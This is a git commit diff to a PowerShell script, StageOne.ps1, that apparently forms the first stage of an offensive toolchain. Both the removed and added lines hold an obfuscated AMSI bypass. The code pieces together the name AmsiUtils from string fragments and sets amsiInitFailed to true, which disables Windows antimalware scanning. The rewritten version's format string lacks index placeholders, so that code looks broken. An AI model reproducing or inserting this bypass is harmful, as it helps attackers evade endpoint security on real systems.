d66e33bfaa049b290e3f0d2881edf736b77ba60b
HeeresS <48584256+HeeresS@users.noreply.github.com>
2023-04-18 13:19:07 +0200

    Update StageOne.ps1

--- StageOne.ps1
+++ StageOne.ps1
@@ -1,7 +1,12 @@
 function Invoke-StageOne {
     # Code for Stage One goes here
    
-$w='Sy'+'stem.'+'Ma'+'na'+'ge'+'ment.A'+'u';$c='si';$m='Uti'+'ls';$ass=[Ref].Assembly.GetType(('{'+'0}m{1}{2}'-f$w,$c,$m));$f=$ass.GetField(('am{0}InitFai'+'led'-f$c),'Non'+'Public,S'+'tati'+'c');$f.SetValue($null,$true)
+$w = 'Sy', 'stem.', 'Ma', 'na', 'ge', 'ment.A', 'u' -join ''
+$c = 'si'
+$m = 'Uti', 'ls' -join ''
+$ass = [Ref].Assembly.GetType(('{}m{}{}' -f $w, $c, $m))
+$field = $ass.GetField(('am{0}InitFailed' -f $c), 'NonPublic,Static')
+$field.SetValue($null, $true)
 
     # If Stage One completes successfully, write a success message
     Write-Host "Stage One succeeded" -ForegroundColor Green
